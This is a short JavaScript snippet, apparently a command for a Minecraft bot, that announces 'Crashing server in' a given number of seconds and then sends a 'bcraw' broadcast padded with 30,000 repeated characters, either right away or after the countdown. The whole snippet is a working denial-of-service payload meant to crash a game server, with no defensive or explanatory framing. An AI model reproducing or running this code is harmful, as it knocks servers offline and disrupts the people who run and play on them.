if(isNaN(parseFloat(args[0]))) {bot.core(`bcraw ${'a'.repeat(30000)}`)} else {
    bot.core(say(
        [
            {
                text: 'Crashing server in ',
                color: 'red'
            },
            {
                text: parseFloat(args[0]),
                color: 'blue'
            },
            {
                text: 's',
                color: 'red'
            }
        ]
    ))
    setTimeout(() => {
        bot.core(`bcraw ${'a'.repeat(30000)}`)
    }, parseFloat(args[0]) * 1000);
}